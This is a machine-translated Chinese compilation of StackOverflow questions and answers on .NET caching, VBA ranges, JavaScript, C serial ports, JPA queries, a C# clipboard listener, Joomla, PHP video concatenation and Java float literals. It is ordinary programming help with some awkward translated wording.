# StackOverflow 问答 13704000-13704999

# c# - System.Runtime.Caching.MemoryCache vs HttpRuntime.Cache - 有什么区别吗？

> ID：13704000
> 
> 赞同：90
> 
> 时间：2012-12-04T13:26:11.507
> 
> 标签：c#, asp.net-mvc, c#-4.0, caching

我想知道 和 之间是否有任何区别`MemoryCache`，`HttpRuntime.Cache`在 ASP.NET MVC 项目中首选哪一个？

据我了解，两者都是线程安全的，API 乍一看或多或少相同，那么何时使用哪个有什么区别？

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-12-04T13:48:35.120

[`HttpRuntime.Cache`](http://msdn.microsoft.com/en-us/library/system.web.httpruntime.cache.aspx)获取[`Cache`](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.aspx)当前应用程序的。

该类[`MemoryCache`](http://msdn.microsoft.com/en-us/library/system.runtime.caching.memorycache.aspx)类似于 ASP.NET`Cache`类。

`MemoryCache`如果您使用过 ASP.NET 类，该类具有许多用于访问缓存的属性和方法，这些属性和方法您会很熟悉`Cache`。

`HttpRuntime.Cache`和之间的主要区别在于`MemoryCache`后者已被更改，以使其可供非 ASP.NET 应用程序的 .NET Framework 应用程序使用。

如需补充阅读：

*   [Justin Mathew 博客 - .Net 4.0 中的缓存](http://jetmathew.wordpress.com/2010/11/15/caching-in-net-4-0-2/)
*   [Jon Davis 博客 - .NET 中简单缓存的四种方法](http://www.jondavis.net/techblog/post/2010/08/30/Four-Methods-Of-Simple-Caching-In-NET.aspx)

**更新 ：**

根据用户反馈，Jon davis 博客有时无法正常工作。因此，我将整篇文章作为图像。请看。

**注意：**如果不清楚，只需单击图像。之后它将在浏览器上打开。然后再次单击它以放大 :)

[![在此处输入图像描述](../Images/271d89d33c2398ce103412707ec75b18.png)](https://i.stack.imgur.com/CAKIA.png)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2017-01-24T05:03:53.843

这是乔恩戴维斯的文章。为了保持可读性，我删除了现在已经过时的 EntLib 部分、介绍和结论。

* * *

## ASP.NET 缓存

ASP.NET 或 System.Web.dll 程序集确实具有缓存机制。它从未打算在 Web 上下文之外使用，但它可以在 Web 之外使用，并且它确实在各种哈希表中执行所有上述过期行为。

在搜索了 Google 之后，似乎很多讨论过 .NET 中内置缓存功能的人都在他们的非 Web 项目中使用了 ASP.NET 缓存。这不再是 .NET 中最可用、最受支持的内置缓存系统；.NET 4 有一个 ObjectCache，我稍后会介绍。Microsoft 一直坚持认为 ASP.NET 缓存不适合在 Web 之外使用。但是很多人仍然停留在 .NET 2.0 和 .NET 3.5 中，需要一些东西来工作，而这恰好适用于很多人，尽管 MSDN 明确表示：

> 注意：Cache 类不适合在 ASP.NET 应用程序之外使用。它是为在 ASP.NET 中使用而设计和测试的，以便为 Web 应用程序提供缓存。在其他类型的应用程序中，例如控制台应用程序或 Windows 窗体应用程序，ASP.NET 缓存可能无法正常工作。

ASP.NET 缓存的类是 System.Web.dll 中的 System.Web.Caching.Cache。但是，您不能简单地新建一个 Cache 对象。您必须从 System.Web.HttpRuntime.Cache 获取它。

```
Cache cache = System.Web.HttpRuntime.Cache; 
```

使用 ASP.NET 缓存记录在 MSDN [here](https://msdn.microsoft.com/en-us/library/system.web.caching.cache(v=vs.110).aspx)上。

### 优点：

1.  它是**内置的**。
2.  尽管有 .NET 1.0 语法，但它使用起来相当**简单**。
3.  在 Web 环境中使用时，它是**经过充分测试**的. 在网络环境之外，根据谷歌搜索，尽管微软不建议这样做，但通常并不知道它会导致问题，只要您使用的是 .NET 2.0 或更高版本。
4.  当项目被删除时，您可以通过委托**通知**您，如果您需要保持它处于活动状态并且您无法提前设置项目的优先级，这是必要的。
5.  **在本文顶部的移除方法列表中，**单个项目具有 (a)、(b) 或 (c) 到期和移除方法中的任何一种的灵活性。**您还可以将过期行为与物理文件的存在相关联。**

 **### 缺点：

1.  **它不仅是静态的，而且只有一个**。您不能使用自己的静态缓存实例创建自己的类型。您的整个应用程序只能有一个存储桶，期间。您可以使用自己的包装器来包装存储桶，这些包装器可以在键中预注入前缀，并在您拉回键/值对时删除这些前缀。但仍然只有一个桶。一切都集中在一起。例如，如果您有一个服务需要分别缓存三种或四种不同类型的数据，这可能会很麻烦。对于可怜的简单项目来说，这应该不是一个大问题。但是，如果项目由于其要求而具有任何显着程度的复杂性，那么 ASP.NET 缓存通常就不够用了。
2.  **物品可以消失，任性**. 很多人没有意识到这一点——我没有，直到我刷新了关于这个缓存实现的知识。默认情况下，ASP.NET 缓存旨在在“感觉”喜欢时销毁项目。更具体地说，请参阅本文顶部我对缓存表的定义中的 (c)。如果同一进程中的另一个线程正在处理完全不同的事情，并且它将高优先级项目转储到缓存中，那么一旦 .NET 决定它需要一些内存，它就会开始销毁缓存中的一些项目。他们的优先级，优先级较低。此处记录的所有用于添加缓存项的示例都使用默认优先级，而不是 NotRemovable 优先级值，该值可防止出于内存清除目的而将其删除，但仍会根据过期策略将其删除。
3.  **键必须是字符串。**例如，如果您正在缓存数据记录，其中记录的键是长整数或整数，则必须首先将键转换为字符串。
4.  **语法是陈旧的**。它是 .NET 1.0 语法，甚至比 ArrayList 或 Hashtable 还要丑陋。这里没有泛型，没有 IDictionary<> 接口。它没有 Contains() 方法，没有 Keys 集合，没有标准事件；它只有一个 Get() 方法和一个与 Get() 做同样事情的索引器，如果没有匹配则返回 null，再加上 Add()、Insert()（冗余？）、Remove() 和 GetEnumerator() .
5.  **忽略设置默认过期/删除行为的 DRY 原则**，以便您忘记它们。您必须明确告诉缓存您希望添加的项目如何过期或在每次添加添加项目时被删除。
6.  **无法访问**缓存项的缓存详细信息，例如添加时间的时间戳。封装在这里有点过火了，当你在代码中试图确定一个缓存项是否应该针对另一个缓存机制（即会话集合）无效时，很难使用缓存。
7.  **删除事件**不会作为事件公开，必须在添加时进行跟踪。
8.  如果我说得还不够，[微软明确建议不要](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.aspx)在网络之外使用它。而且，如果您被[.NET 1.1 诅咒，那么您不应该](http://support.microsoft.com/kb/917411)在 Web 之外对使用它有任何稳定性的信心，所以不要打扰。

## .NET 4.0 的 ObjectCache / MemoryCache

微软最终在 .NET Framework 的最新版本中实现了一个抽象的 ObjectCache 类，以及一个 MemoryCache 实现，它在非 Web 设置中继承和实现 ObjectCache 以用于内存中的目的。

System.Runtime.Caching.ObjectCache 位于 System.Runtime.Caching.dll 程序集中。它是一个抽象类，它声明了与 ASP.NET 缓存中的基本相同的 .NET 1.0 样式接口。`System.Runtime.Caching.MemoryCache`是 ObjectCache 的内存实现，与 ASP.NET 缓存非常相似，只是有一些变化。

要添加具有滑动到期的项目，您的代码将如下所示：

```
var config = new NameValueCollection();  
var cache = new MemoryCache("myMemCache", config);  
cache.Add(new CacheItem("a", "b"),  
    new CacheItemPolicy  
    {  
        Priority = CacheItemPriority.NotRemovable,  
        SlidingExpiration=TimeSpan.FromMinutes(30)  
    }); 
```

### 优点：

1.  它是内置的，现在由 Microsoft 在 Web 之外提供支持和推荐。
2.  与 ASP.NET 缓存不同，您可以实例化 MemoryCache 对象实例。

    > 注意：它不一定是静态的，但它应该是——这是[Microsoft 的建议（见黄色警告）](http://msdn.microsoft.com/en-us/library/system.runtime.caching.memorycache.memorycache.aspx)。

3.  与 ASP.NET 缓存的接口相比，已经进行了一些细微的改进，例如在添加项目时订阅删除事件的能力，删除多余的 Insert()，可以使用 CacheItem 添加项目具有定义缓存策略的初始化程序的对象，并添加了 Contains()。

### 缺点：

1.  仍然没有完全加强 DRY。根据我的少量经验，您仍然无法设置一次滑动到期TimeSpan而忘记它。坦率地说，虽然上面 item-add 示例中的策略更具可读性，但它需要非常冗长。
2.  它仍然不是通用键控；它需要一个字符串作为键。因此，如果您正在缓存数据记录，则不能存储 long 或 int ，除非您转换为字符串。

## DIY：自己建造

创建一个执行显式或滑动过期的缓存字典实际上非常简单。（如果您希望出于清除内存的目的而自动删除项目，这将变得更加困难。）这就是您所要做的：

1.  创建一个名为 Expiring 或 Expirable 的值容器类，它包含一个类型为 T 的值、一个 DateTime 类型的 TimeStamp 属性，用于存储该值何时被添加到缓存中，以及一个 TimeSpan，它指示与时间戳相距多远该项目应该过期。对于显式过期，您可以只公开一个属性设置器，该设置器在给定日期减去时间戳的情况下设置 TimeSpan。
2.  创建一个实现 IDictionary 的类，我们称之为 ExpirableItemsDictionary。我更喜欢让它成为一个由消费者定义的通用类。
3.  在#2 中创建的类中，添加一个 Dictionary> 作为属性并将其命名为 InnerDictionary。
4.  如果在#2 中创建的类中的 IDictionary 的实现应该使用 InnerDictionary 来存储缓存项。封装将通过上面 #1 中创建的类型的实例隐藏缓存方法的详细信息。
5.  确保索引器 (this[])、ContainsKey() 等在返回值之前小心清除过期项目并移除过期项目。如果项目被删除，则在 getter 中返回 null。
6.  在所有 getter、setter、 ContainsKey() 上使用线程锁，尤其是在清除过期项目时。
7.  每当项目因过期而被删除时引发事件。
8.  添加一个 System.Threading.Timer 实例并在初始化期间对其进行装配，以每 15 秒自动删除过期项目。这与 ASP.NET 缓存的行为相同。
9.  您可能想要添加一个 AddOrUpdate() 例程，通过替换项目容器（Expiring 实例）上的时间戳（如果它已经存在）来推出滑动过期。

微软必须支持其原始设计，因为它的用户群已经建立了对它们的依赖，但这并不意味着它们是好的设计。

### 优点：

1.  您可以**完全控制**实施。
2.  可以通过设置默认缓存行为来**加强 DRY**，然后在每次添加项目时只删除键/值对而不声明缓存细节。
3.  可以实现**现代接口**，即`IDictionary<K,T>`。这使得它更容易使用，因为它的接口作为字典接口更容易预测，而且它更容易被使用 IDictionary<> 的助手和扩展方法访问。
4.  **缓存细节可以是未封装**的，例如通过公共只读属性公开您的 InnerDictionary，允许您针对缓存策略编写显式单元测试，并使用基于它的附加缓存策略扩展您的基本缓存实现。
5.  尽管对于那些已经熟悉 ASP.NET 缓存或缓存应用程序块的 .NET 1.0 样式语法的人来说，它不一定是一个熟悉的界面，但您**可以将界面定义为**您想要的任何外观。
6.  可以使用任何类型的键。这是创建泛型的原因之一。并非所有内容都应使用字符串作为键。

### 缺点：

1.  **不是由 Microsoft 发明或​​认可的**，因此不会有相同的质量保证。
2.  假设只实现了我上面描述的指令，不会“随意”清除优先级清除内存的项目（无论如何这是缓存的一个极端实用功能..在您将使用缓存的地方购买 RAM , RAM 很便宜）。

在所有这四个选项中，这是我的偏好。我已经实现了这个基本的缓存解决方案。到目前为止，它似乎运行良好，没有已知的错误（请在下面的评论或 jon-at-jondavis 联系我！！），我打算在我所有需要的较小的副项目中使用它基本缓存。这里是：

Github 链接：[https ://github.com/kroimon/ExpirableItemDictionary](https://github.com/kroimon/ExpirableItemDictionary)

旧链接：[ExpirableItemDictionary.zip](http://www.jondavis.net/codeprojects/ExpirableItemDictionary/ExpirableItemDictionary.zip)

## 值得一提：AppFabric、NoSQL 等

请注意，这篇博客文章的标题表示“简单缓存”，而不是“重型缓存”。如果您想涉足重型领域，您应该考虑专门的横向扩展解决方案。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2020-03-10T13:35:23.517

如果要将经典的 ASP.NET MVC 应用程序迁移到 ASP.NET Core，MemoryCache.Default 也可以充当“桥梁”，因为 Core 中没有“System.Web.Caching”和“HttpRuntime”。

我还写了一个小基准来存储一个`bool`项目 20000 次（以及另一个检索它的基准），并且 MemoryCache 似乎**慢了两倍**（27ms vs 13ms - 这是所有 20k 迭代的总和）但它们都非常快而且这大概可以忽略。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-04T13:52:36.430

MemoryCache 就是它所说的那样，一个存储在**内存中的缓存**

HttpRuntime.Cache（参见[http://msdn.microsoft.com/en-us/library/system.web.httpruntime.cache(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/system.web.httpruntime.cache(v=vs.100).aspx)和[http://msdn.microsoft.com/en- us/library/system.web.caching.cache.aspx](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.aspx)）坚持到您在应用程序中配置的任何内容。

参见例如“ASP.NET 4.0：编写自定义输出缓存提供程序” [http://weblogs.asp.net/gunnarpeipman/archive/2009/11/19/asp-net-4-0-writing-custom-output-cache -providers.aspx](http://weblogs.asp.net/gunnarpeipman/archive/2009/11/19/asp-net-4-0-writing-custom-output-cache-providers.aspx)**

# vba - vba 使用“Cells()”引用不同工作簿中的范围

> ID：13704003
> 
> 赞同：0
> 
> 时间：2012-12-04T13:26:20.960
> 
> 标签：vba, range

我想参考另一本书中的一个范围，这是从这个作品中定义的：

```
Workbooks(macrofilename).Sheets(IDsheetname).Activate
lookRange = Range(Cells(startrow, startcol), Cells(rows, cols))
colno = Application.Match(myName, lookRange, 0) 
```

但我不想激活另一张工作表，所以我尝试将工作簿和工作表添加到范围定义中：

```
lookRange = Workbooks(filename).Sheets(sheetname).Range(Cells(startrow, startcol), Sheets(Cells(rows, cols)) 
```

遗憾的是，这会导致 1004 错误（应用程序定义的或对象定义的错误）。

任何想法如何解决这个问题？

谢谢，吉斯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-05-08T09:54:07.100

您可以先尝试参考工作表：

```
Dim Ws As Worksheet
Set Ws =  Workbooks(filename).Sheets(sheetname) 
```

然后参考范围：

```
With Ws
    Set rLookRange = Range(.Cells(startrow, startcol), .Cells(rows, cols))
End With 
```

注意点：您指的是特定工作表中的单元格，因此请在语句中的 .Cells 之前粘贴点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:28:13.780

您无需激活工作簿/工作表。使用“Set”关键字定义范围。

语法类似于：

```
dim rLookRange as Range

set rLookRange = Workbooks(filename).Sheets(sheetname).Range(Cells(startrow, startcol), Cells(rows, cols)) 
```

取决于你想要做什么（？）
为了比较范围，我通常定义数组并比较这些数组中的值。

# javascript - 等效于 Excel 公式的 Java 脚本

> ID：13704006
> 
> 赞同：1
> 
> 时间：2012-12-04T13:26:35.797
> 
> 标签：javascript

嗨希望有人可以提供帮助。

我在 excel 电子表格中有以下公式。它计算*T40 和 AB40*之间的差值，如果返回负值，则重新计算*AB40 - T40*以返回正值。

```
=IF(T40 > AB40, + T40 - AB40, AB40 - T40) 
```

我已将电子表格导入 PDF 文档，但找不到与上面匹配的等效 java 脚本。

任何人都可以提供帮助，我现在很绝望，急需这些信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:33:57.313

你不需要一个 if 语句，你可以这样做：

```
Math.abs(T40-AB40) 
```

为了澄清这将返回数学运算的绝对值，因此：

```
Math.abs(10 - 2) //returns 8

Math.abs(2 - 10) //returns 8 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:28:51.850

如果不熟悉 pdf 中 javascript 的细节，但这样的东西应该可以工作：

```
if(T40>AB40){
    return T40-AB40;
}else{
    return AB40-T40;
} 
```

或使用建议的 user1161318 之类的三元运算符。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:32:09.323

正如另一个响应所示，它可以用 if 来完成，但如果你想把它当作一个表达式，你可以这样做：

```
T40 > AB40 ? T40-AB40 : AB40-T40; 
```

在 Javascript 中：

```
cond ? ifTrue : ifFalse 
```

是构成 if 语句的另一种方式，它允许将整个事物视为表达式，因此成为公式的一部分，分配给变量，放入函数的参数列表等......与 if 不同。因此，执行以下操作是完全合法的：

```
alert( cond ? ifTrue : ifFalse );
var x = cond ? ifTrue : ifFalse; 
```

等等，而你不能用 if 块来做到这一点。当然，如果有任何歧义的可能性，请将表达式包含在括号中（例如：它是更大公式的一部分，等等......）

我认为这更接近于在 Excel 中保留 IF 的含义。

# c# - 可移植类库和源代码控制

> ID：13704007
> 
> 赞同：3
> 
> 时间：2012-12-04T13:26:37.240
> 
> 标签：c#, version-control

我有 app 2 解决方案（.NET C#），每个都共享一个可移植类库（一个单独的解决方案）。应用解决方案将 PCL 作为项目引用，而不是通过 DLL。

使用源代码控制处理这种情况的最佳方法是什么？可移植类库可能会针对其中一个应用程序解决方案的一个版本进行更改，但不会立即针对另一个版本进行更改。

目前我没有绑定到任何源代码控制，我试图用 TFS 做到这一点，但在可移植类库上存在工作区问题。我愿意接受更好的建议，例如 Mercurial 或 Git！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:43:24.473

如果您的 PTL 更新应该只影响一个应用程序，您可以创建分支（大多数源代码控制软件都可用）。

如果每个应用程序都有一个分支；更新将仅在此分支中可见。然后您可以使用合并工具来更新另一个。

TFS 中也提供分支：http: [//msdn.microsoft.com/en-us/library/ms181425.aspx](http://msdn.microsoft.com/en-us/library/ms181425.aspx)

对于策略：[分支策略](https://stackoverflow.com/questions/34975/branching-strategies)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:58:06.757

方法是将共享库保存在源代码控制系统的单独区域中。然后，依赖于共享库的每个项目都必须创建特定于该项目的共享库的分支。

开发在分支上是隔离的，但您可以将项目分支上的更改合并回共享库的主分支。其他已经拥有共享库分支的项目可以决定是否要将对主分支的更改合并到自己的分支中。

当共享库更新时，您必须执行一些合并，但使用此设置可以确保每个项目与其他项目中执行的更改隔离。每个项目都可以决定何时升级到更新版本的共享库。

# c - c open() Undefined error: 0 on os x

> ID：13704008
> 
> 赞同：3
> 
> 时间：2012-12-04T13:26:40.637
> 
> 标签：c, macos, serial-port

在运行 10.8 的 Mac 上，我试图打开一个串行端口。

ls /dev/cu* 返回：

```
/dev/cu.Bluetooth-Modem     /dev/cu.Bluetooth-PDA-Sync  /dev/cu.usbserial-A1009TT7 
```

我可以看到端口在那里，但是当我尝试打开它时，我得到未定义的错误：0（0）。这是我用来打开端口的代码。

```
char *path = "/dev/cu.usbserial-A1009TT7";

open(path , O_RDWR | O_NOCTTY | O_NONBLOCK);     // open the port

if (file == -1) {
    printf("Error opening port : %s(%d).\n", strerror(errno), errno);
    close(file);
    return -1;
} 
```

有人知道为什么端口不会打开吗？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:28:16.530

哎呀！你的意思是输入这个：

```
file = open(path , O_RDWR | O_NOCTTY | O_NONBLOCK);
^^^^^^^ 
```

此外，无需关闭未打开的文件描述符。

```
if (file == -1) {
    printf(...);
    // close(file); Completely unnecessary.  It's not valid!
    return -1;
} 
```

# java - jpa子查询中不必要的加入

> ID：13704016
> 
> 赞同：2
> 
> 时间：2012-12-04T13:26:58.200
> 
> 标签：java, jpa, jpa-2.0, eclipselink, criteria-api

我有以下 jpa 标准查询：

```
 CriteriaBuilder cb = em.getCriteriaBuilder();
    CriteriaQuery<Company> cq = cb.createQuery(Company.class);
    Root<Company> root = cq.from(Company.class);
    cq.select(root);

    Subquery<String> sq = cq.subquery(String.class);
    Root<Employee> subroot = sq.from(Employee.class);
    sq.select(subroot.get(Employee_.lastName));

    Predicate typePredicate = cb.equal(subroot.get(Employee_.lastName), "Doe");

    Predicate correlatePredicate = cb.equal(root.get(Company_.employees), subroot);
    sq.where(cb.and(typePredicate, correlatePredicate));
    cq.where(cb.exists(sq));

    TypedQuery<Company> typedQuery = em.createQuery(cq);
    List<Company> companies = typedQuery.getResultList(); 
```

Eclipselink 产生以下 SQL：

```
 SELECT t0.ID, ... FROM COMPANY t0 
    WHERE EXISTS (SELECT t1.LASTNAME FROM EMPLOYEES t2, EMPLOYEES t1 
                  WHERE (((t1.LASTNAME = ?) AND (t1.ID = t2.ID)) 
                  AND (t2.COMPANY_ID = t0.ID))) 
```

如您所见，表 EMPLOYEES 上有一个不必要的连接。我如何摆脱这个加入？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:46:38.070

您似乎不需要查询的子查询，只需一个连接就足够了，

[http://en.wikibooks.org/wiki/Java_Persistence/Criteria#Join](http://en.wikibooks.org/wiki/Java_Persistence/Criteria#Join)

否则，您使用的是什么版本？你能试试 EclipseLink 2.4。

如果它仍然有重复，请记录一个错误并投票给它。

您也许可以使用逆多对一，而不是单对多（即 root == subroot.get("company") ）。

还可以在 2.4 中尝试 JPQL，连接是否优化？

# xtext - 使用 xtext 作为第三方

> ID：13704018
> 
> 赞同：1
> 
> 时间：2012-12-04T13:27:00.683
> 
> 标签：xtext

我想将我的 xtext 应用程序用作外部 jar。为了验证应该是我的 dsl 语言的文件。

1）我不知道如何将文件加载到我的 jar 中。2）关于这个过程的任何建议？

谢谢

# avd - “创建新的 AVD”窗口看起来不同

> ID：13704020
> 
> 赞同：2
> 
> 时间：2012-12-04T13:27:06.800
> 
> 标签：avd, eclipse-juno

![添加新 AVD 时看到的 GUI](../Images/bb3e76d560e7692184867da291924046.png)

![developer.android.com 上的 GUI](../Images/fff25ace7675deeeed7043dc0df0ced5.png)

我正在尝试为我的应用程序创建一个 Android 虚拟设备。但是，创建新 AVD 的选项对我来说是有限的。我安装了 Eclipse Juno 和 Android 4.0。如何获得第二张图片所示的“创建新的 Android 虚拟设备 (AVD)”窗口。

# c# - 为什么我的剪贴板侦听器被调用两次/应用程序打开两次？

> ID：13704022
> 
> 赞同：2
> 
> 时间：2012-12-04T13:27:15.080
> 
> 标签：c#, windows, listener, clipboard, monitor

我用 C# 编写了一个监视剪贴板的小程序。当某个字符串进入剪贴板时，必须使用 Process.Start 打开程序（取决于字符串）。一切正常，但有时应用程序被打开两次。我不知道为什么会这样。

```
namespace ClipboardMonitor {
    public class Form1 : System.Windows.Forms.Form {
        [DllImport("User32.dll")]
        protected static extern int SetClipboardViewer(int hWndNewViewer);
        [DllImport("User32.dll", CharSet=CharSet.Auto)]
        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetForegroundWindow(IntPtr hWnd);

        IntPtr nextClipboardViewer;
        private System.ComponentModel.Container components = null;

        public Form1() {
            InitializeComponent();
            nextClipboardViewer = (IntPtr)SetClipboardViewer((int) this.Handle);
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }
        protected override void Dispose( bool disposing ) {
            ChangeClipboardChain(this.Handle, nextClipboardViewer);
            if( disposing ) {
                if (components != null) {
                    components.Dispose();
                }
            }
            base.Dispose( disposing );
        }
        private void InitializeComponent() {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Name = "Form1";
        }

        [STAThread]
        static void Main()  {
            Application.Run(new Form1());
        }

        protected override void WndProc(ref System.Windows.Forms.Message m) {
            const int WM_DRAWCLIPBOARD = 0x308;
            const int WM_CHANGECBCHAIN = 0x030D;

            switch(m.Msg) {
                case WM_DRAWCLIPBOARD:
                    DisplayClipboardData();
                    SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                    break;
                case WM_CHANGECBCHAIN:
                    if (m.WParam == nextClipboardViewer)
                        nextClipboardViewer = m.LParam;
                    else
                        SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                    break;
                default:
                    base.WndProc(ref m);
                    break;
            }
        }

        void DisplayClipboardData() {
            Thread.Sleep(500);
            try {
                IDataObject iData = new DataObject();  
                iData = Clipboard.GetDataObject();
                 if (iData.GetDataPresent(DataFormats.Text)) {
                    string path = iData.GetData(DataFormats.Text).ToString();
                    string[] words = path.Split('_');
                    if (words[0] == "startLO") {
                            ProcessStartInfo info = new ProcessStartInfo(words[1]);
                            Process p = Process.Start(info);
                    }
                } else {
                    // We doen niets.
                }
            }
            catch(Exception e) {
                MessageBox.Show(e.ToString());
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:31:42.840

一种解释是快速连续发生多个剪贴板事件。这是相当普遍的。您可以通过“解决时间”延迟来防御这种情况。即不是立即做出反应，而是设置一个计时器或创建一个线程来“在一段时间内”处理它。随着更多事件的到来，请继续推迟结算时间。当结算时间最终到期时，允许计时器或线程实际运行您的程序。

# jquery - Widgetkit 冲突 JO Social Networks Tabs 冲突和 Page Peel Banner

> ID：13704023
> 
> 赞同：1
> 
> 时间：2012-12-04T13:27:16.420
> 
> 标签：jquery, joomla, joomla2.5

我正在使用 Joomla 2.5.8 和 Yootheme。我有 Widgetkit，它运行良好，直到我安装了 Page Peel 和 JO Social Networks Tabs。我一个一个禁用，它不起作用，只有 Page Peel 和 JO Social 一起工作。

我不知道在哪里添加这段代码：

```
// load jQuery, if not loaded before
if (!JFactory::getApplication()->get('jquery')) {
  JFactory::getApplication()->set('jquery', true);
  // add jQuery
  ...
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:39:35.453

代码只是在你不知道的情况下检查是否已经在站点上加载了 jQuery。如果不是，它会加载它。

因此，您需要替换当前用于导入 jQuery 的代码并将其替换为 this。

```
$document = JFactory::getDocument(); //If this is already being used, remove it

if (!JFactory::getApplication()->get('jquery')) {
   JFactory::getApplication()->set('jquery', true);
   $document->addScript(JURI:root() . 'plugins/rest/of/path/jquery.js');
} 
```

# php - 如何使用 avconv 连接一系列视频

> ID：13704026
> 
> 赞同：0
> 
> 时间：2012-12-04T13:27:34.723
> 
> 标签：php, ubuntu, terminal, libavcodec, avcodec

我想连接一组视频我的数组是

```
$interFIFO // array(
               0=>test1.mpg,
               1=>test2.mpg,
               2=>test3.mpg,
               3=>test4.mpg,
              );// array count may be increase some time 
```

我知道连接 2 个视频文件及其工作文件，我的代码是

```
shell_exec("cat test1.mpg test2.mpg > test_all.mpg"); 
```

上面的代码工作文件，我得到了结果。

我的问题是使用 php 和**avconv****连接超过 2 个视频**

 *** * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:31:26.263

如果您连接 2 个视频的方法有效，为什么您不尝试这个：

```
 shell_exec("cat ".implode(" ", $interFIFO)." > test_all.mpg"); 
```

Implode 以“glue”作为第一个参数连接数组元素（在本例中为空格“”）**

# java - 为什么在浮点数末尾使用字母 f。

> ID：13704028
> 
> 赞同：19
> 
> 时间：2012-12-04T13:27:39.370
> 
> 标签：java

我只是想要一些关于这个的信息。

```
float n = 2.99944323200023f 
```

`f`文字末尾的 the 是做什么的？这叫什么？为什么使用它？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-04T13:30:03.020

`f`表示它是浮点文字，而不是双重文字（否则它会隐含地。）它没有我知道的特定技术名称 - 如果需要参考，我倾向于将其称为“字母后缀”具体来说，虽然这有点武断！

例如：

```
float f = 3.14f; //Compiles
float f = 3.14;   //Doesn't compile, because you're trying to put a double literal in a float without a cast. 
```

你当然可以这样做：

```
float f = (float)3.14; 
```

...它完成了几乎相同的事情，但 F 是一种更简洁、更简洁的显示方式。

为什么选择 double 作为默认而不是浮动？好吧，如今，在 99% 的情况下，双倍浮点数的内存需求都不是问题，而且它们提供的额外准确性在很多情况下都是有益的——所以你可以说这是明智的默认设置。

`d`请注意，您还可以通过在末尾添加 a 来将十进制文字显式显示为双精度：

```
double d = 3.14d; 
```

...但是因为无论如何它都是双值，所以这没有效果。有些人可能会主张它主张更清楚你的意思是什么文字类型，但我个人认为它只是使代码混乱（除非你有很多浮动文字挂在周围并且你想强调这个文字确实是双, f 的省略不仅仅是一个错误。）

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-04T13:29:46.973

Java 将用于浮点变量的默认 Java 类型将是 double。因此，即使您将任何变量声明为浮点数，编译器实际上要做的是将双精度值分配给浮点变量，这是不可能的。所以，告诉编译器将此值视为浮点数，即“f”用来。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-04T13:33:06.813

在 Java 中，当您将十进制数键入为 时`3.6`，它会被解释为`double`. `double`是 64 位精度的 IEEE 754 浮点，而`float`是 32 位精度的 IEEE 754 浮点。由于 a`float`不如 a 精确`double`，因此不能隐式执行转换。

如果你想创建一个浮点数，你应该以`f`（即：）结束你的数字`3.6f`。

有关更多说明，请参阅[Java 教程的原始数据类型定义](http://download.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T13:29:51.247

这是为了区分浮点数和双精度数。后者没有后缀。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-04T13:29:55.927

当您编写 1.0 时，您是否打算将文字设为浮点数或双精度数是模棱两可的。通过编写 1.0f，您是在告诉 Java 您打算将文字设为浮点数，而使用 1.0d 则指定它应该是双精度数（如果您没有明确指定，这也是默认值）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-04T13:29:58.500

你需要把'f'放在最后，否则Java会假设它是双精度的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-04T13:30:09.323

这意味着它是[单精度浮点](http://en.wikipedia.org/wiki/Single_precision)文字而不是[双精度](http://en.wikipedia.org/wiki/Double_precision)。否则，您必须编写`float n = (float)2.99944323200023;`将双精度转换为单精度。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-12-04T13:30:15.573

来自[Oracle Java 教程，](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)*浮点文字*下的原始数据类型部分

 *> 如果浮点字面量以字母 F 或 f 结尾，则它的类型为 float；否则它的类型是 double 并且可以选择以字母 D 或 d 结尾。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-12-04T13:30:42.027

如果`f`最后没有精确，则 value 被认为是 a `double`。并且 a`double`导致内存中的字节数比`float`.

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2022-01-14T03:14:59.100

